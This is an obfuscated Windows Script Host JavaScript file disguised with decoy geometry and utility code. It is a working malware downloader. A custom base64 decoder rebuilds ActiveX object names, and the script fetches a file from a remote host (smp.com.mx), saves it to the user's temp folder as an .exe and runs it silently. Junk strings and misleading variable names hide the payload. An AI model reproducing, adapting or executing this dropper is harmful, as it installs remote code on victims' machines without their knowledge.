
var illuminate = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  elimination = [];
	
var sanskrit = { ':': '.','U': 'S','381': 'X'};
	var dangerous = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function circumcised(dependence) {
	clamorous = dependence;
	for (var i in sanskrit){clamorous = clamorous.replace(i, sanskrit[i]);}
    return clamorous;
};

var begins = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.circumcised4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("ringtone").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = illuminate[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = illuminate[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = illuminate[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = illuminate[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var appreciate ="ringtoneJVringtoneRFTVringtoneAl".circumcised4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var negligent = "ringtoneQWringtoneN0aXZringtonelWE9iaringtonemVjdA=ringtone=".circumcised4();
String.prototype.circumcised2 = function () {
    var simulate = {
        waterproof: this
    };
    simulate.apply = simulate.waterproof["c3Vic3RyaW5n".circumcised4()](dangerous, begins);
    return simulate.apply;
};

var undesirable ="ringtoneRXhwYW5ringtonekRW52aXringtoneJvbm1lbnRTdHJringtonepbmdz".circumcised4();
var Native = function(options){
	
};
var fustian = [negligent, undesirable,appreciate,  ""+"."+("prediction","unbound","convivial","avenue","flooring","struck","indices","leafy","exe"), "UnVu".circumcised4(), circumcised("M"+"SX"+"ML"+("disable","silky","informational","spice","translate","unpropitious","indus","2.")+"381M"+"LH"+"TT"+("levity","motif","chisel","bluish","amendments","belong","immediate","leaked","P>")+"WU"+("pills","illiterate","christians","idealist","undertake","unborn","fonts","cr")+("kennels","operating","incentives","pistil","loquacious","askew","imputation","experimenting","ip")+"t:"+("based","racial","windward","permanent","simulations","necessarily","accoutred","diluted","Sh")+"ell")];
staunch = "_F2_";
var simplify = this[fustian.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
VpNRuUlYxS = "SojLuyU";
algonquin = (("mature", "sandy", "kathleen", "gossip", "baptismal", "prescription", "reefs", "pODuNtQjEV") + "PXoGAtdQfv").circumcised2();
engaged = (("pater", "determines", "emperor", "bibliographic", "slack", "custard", "mongrel", "wildcat", "declaration", "sbRKiKzghv") + "brDWlB").circumcised2();
  
    String.prototype.bewail = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var phlegm = fustian.pop().split(">");

calculators = "b3Blbg==".circumcised4();
var promise = new simplify(phlegm[1]);
var morocco = new simplify(phlegm[0]);
var locate = promise[fustian.shift()](fustian.shift());
weasel = "E";

var larvae = fustian.shift();
var dating = fustian.shift();
function affected(aptitude, medium) {

    try {
        var poole = locate + "/" + medium ;
		poole = poole+ larvae;
            morocco[calculators](("announcements","opaque","G" + weasel) + ("regency","crayon","conclusions","monaco","T"), aptitude, false);
       
    tbkpokGUc = "_F7_";
    morocco[engaged + ("epidemic","puerile","end")]();
	var virgin=("algonquin" + WScript=="algonquin" + "V2luZG93cyBTY3JpcHQgSG9zdA==".circumcised4())&&morocco["c3RhdHVz".circumcised4()] +""=="MjAw".circumcised4()&&typeof(NOICszd)==="undefined";
	lQHNgR = "_F8_";
    if (virgin) {
		
        var cooperate = new simplify((("programmer","ephesians","patch","november","animation","activated","pittsburgh","luggage","A")+("warily","piece","syracuse","bufing","prints","drawback","municipal","intermittently","SEOO")+"DB"+("ordain","sector","jeffrey","recur","little","worldliness","refutation",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        cooperate[calculators]();
        KIEIrdwzMN = "_F9_";
        cooperate.type = begins;
        JJoRBxekn = "_F10_";
        cooperate["d3JpdGU=".circumcised4()](morocco[("please","translate","tangible","viceroy","check","authorized","outline","")+"R"+"es"+"pon"+sanskrit['U'].toLowerCase()+"e"+"Qm9keQ==".circumcised4()]);
        HenHossMyI = "_F11_";
        cooperate[(algonquin + "o"+("obstruct","encourages","normally","preceptor","ailment","sword","insurgents","cobbler","00")+("observable","grove","recruitment","major","register","functions","billiard","8i")+"tion").replace("0"+("decision","tuition","equitable","licking","toothache","johns","restaurant","08"), engaged)] = 0;
        AjARUJIhRNw = "_F12_";
        cooperate.saveToFile(poole, 2);
        prAzWgfnoOb = "_F13_";
        cooperate.close();
        EradJe = "_F14_";
		promise[dating](poole, begins, true);
    }
} catch (oeMjANaFMu) { };

    vWkkWq = "_F15_";
}
try{
affected("aHR0cDovLw==".circumcised4()+"\u0073\u006D\u0070"+"\u002E\u0063\u006F\u006D\u002E\u006D\u0078\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?SvFtvCKhwm=JFwMbiNBi","KWArRk");}catch(dRttJpQI){}

   TIkxsq = "_F16_";
   